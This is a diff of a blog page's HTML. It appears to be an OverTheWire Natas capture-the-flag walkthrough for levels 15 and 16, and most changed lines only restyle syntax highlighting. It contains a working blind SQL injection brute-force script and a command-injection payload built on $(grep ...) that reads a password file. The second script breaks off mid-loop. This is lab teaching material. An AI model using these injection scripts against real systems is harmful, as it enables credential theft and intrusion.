 &lt;p&gt;To pick this additional clause, we look at the &lt;a href="http://www.w3schools.com/sql/sql_wildcards.asp"&gt;SQL wildcards and keywords&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;We can use the SQL function &lt;a href="http://www.1keydata.com/sql/sql-substring.html"&gt;SUBSTRING&lt;/a&gt; and the symbol &lt;strong&gt;%&lt;/strong&gt; to compare strings. For example, the following checks whether there is an &lt;strong&gt;a&lt;/strong&gt; in the third position of the variable password:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;AND SUBSTRING(password,3,1) = BINARY &amp;quot;a&amp;quot;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BINARY&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -645,33 +643,33 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;p&gt;Beautiful.&lt;/p&gt;
 &lt;h4&gt;Crafting the attack:&lt;/h4&gt;
 &lt;p&gt;We use Python's &lt;a href="http://docs.python-requests.org/en/latest/user/quickstart/"&gt;request&lt;/a&gt; library to craft our attack:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;KEYWORD&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
         &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
             &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                 &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                 &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;
                 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;KEYWORD&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                         &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-                        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Password so far: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+                        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Password so far: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                         &lt;span class="k"&gt;break&lt;/span&gt;
         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;
 
-&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="c1"&gt;# authorization: login and password&lt;/span&gt;
-        &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas15&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;*******************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="c"&gt;# authorization: login and password&lt;/span&gt;
+        &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas15&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;*******************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
-        &lt;span class="c1"&gt;# BASE64 password and 32 bytes&lt;/span&gt;
+        &lt;span class="c"&gt;# BASE64 password and 32 bytes&lt;/span&gt;
         &lt;span class="n"&gt;CHARS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ascii_letters&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;
         &lt;span class="n"&gt;LENGTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;
 
-        &lt;span class="c1"&gt;# crafted url option 1&lt;/span&gt;
-        &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://natas15.natas.labs.overthewire.org?username=natas16&amp;quot; AND SUBSTRING(password,&amp;#39;&lt;/span&gt;
-        &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;,1) LIKE BINARY &amp;quot;&amp;#39;&lt;/span&gt;
-        &lt;span class="n"&gt;KEYWORD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;exists&amp;#39;&lt;/span&gt;
+        &lt;span class="c"&gt;# crafted url option 1&lt;/span&gt;
+        &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas15.natas.labs.overthewire.org?username=natas16&amp;quot; AND SUBSTRING(password,&amp;#39;&lt;/span&gt;
+        &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;,1) LIKE BINARY &amp;quot;&amp;#39;&lt;/span&gt;
+        &lt;span class="n"&gt;KEYWORD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;exists&amp;#39;&lt;/span&gt;
 
         &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;KEYWORD&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -680,50 +678,50 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;p&gt;After around 10 minutes we have our password.&lt;/p&gt;
 &lt;h3&gt;Level 16: OS Command Injection III&lt;/h3&gt;
 &lt;p&gt;This level starts with a searching form:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/kMHZzZ9.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/kMHZzZ9.png" /&gt;&lt;/p&gt;
 &lt;p&gt;The source code is similar to the 9th and 10th levels:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
-&lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;preg_match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/[;|&amp;amp;`\&amp;#39;&amp;quot;]/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Input contains an illegal character!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
+&lt;span class="err"&gt;&amp;lt;&lt;/span&gt;?
+$key = &amp;quot;&amp;quot;;
+if(array_key_exists(&amp;quot;needle&amp;quot;, $_REQUEST)) {
+    $key = $_REQUEST&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
+}
+if($key != &amp;quot;&amp;quot;) {
+    if(preg_match(&amp;#39;/&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;|&amp;amp;&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;quot;]/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nx"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Input contains an illegal character!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;grep -i &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;$key\&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="nx"&gt;dictionary&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;txt&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;);&lt;/span&gt;
-&lt;span class="s2"&gt;    }&lt;/span&gt;
-&lt;span class="s2"&gt;}&lt;/span&gt;
-&lt;span class="s2"&gt;?&amp;gt;&lt;/span&gt;
-&lt;span class="s2"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
+        &lt;span class="nx"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;grep -i &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;$key&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt; dictionary.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="o"&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nx"&gt;pre&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The difference now is that the code is being hygienized for &lt;strong&gt;`&lt;/strong&gt;, &lt;strong&gt;"&lt;/strong&gt;, and &lt;strong&gt;'&lt;/strong&gt;. The old attack adding &lt;strong&gt;""&lt;/strong&gt; won't work.&lt;/p&gt;
 &lt;p&gt;We need to figure out what else we can use.&lt;/p&gt;
 &lt;p&gt;Bash has a feature called &lt;a href="http://www.tldp.org/LDP/abs/html/commandsub.html"&gt;command substitution&lt;/a&gt;, where  commands can be passed with:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$(command)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;For example, the date command:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nv"&gt;MY_CMD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
-$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$MY_CMD&lt;/span&gt;
-Wed Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&gt;:23:41 EDT &lt;span class="m"&gt;2014&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ MY_CMD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$(date)&amp;quot;&lt;/span&gt;
+&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$MY_CMD&lt;/span&gt;
+Wed Oct 14 20:23:41 EDT 2014
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h4&gt;Stating the attack:&lt;/h4&gt;
 &lt;p&gt;We are going to use command substitution to craft a command in the variable &lt;em&gt;$key&lt;/em&gt;, which lies inside:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;grep -i \&amp;quot;$key\&amp;quot; dictionary.txt
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$key&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; dictionary.txt&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We are going to add another grep! Let's call it &lt;em&gt;grep II&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;This time we will give it the flag &lt;code&gt;-E&lt;/code&gt; to allow the use of regular expressions.&lt;/p&gt;
 &lt;p&gt;So, for example, we can use the &lt;em&gt;regex wildcard&lt;/em&gt; &lt;strong&gt;.*&lt;/strong&gt; to search for a char (say &lt;em&gt;a&lt;/em&gt;) in the password string:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$(grep -E ^a.* /etc/natas_webpass/natas17)banana
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas_webpass&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas17&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;banana&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -737,32 +735,32 @@ Wed Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&
 &lt;p&gt;http://natas16.natas.labs.overthewire.org/?needle=$(grep%20-E%20^a.*%20/etc/natas_webpass/natas17)banana&amp;amp;submit=Search&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;This allows us to write the following script:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
         &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
             &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
-                &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Position &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;: Trying &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; ...&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
+                &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Position &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s"&gt;: Trying &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; ...&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
                 &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;URL1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;URL2&lt;/span&gt;  &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bananas&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;bananas&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                         &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
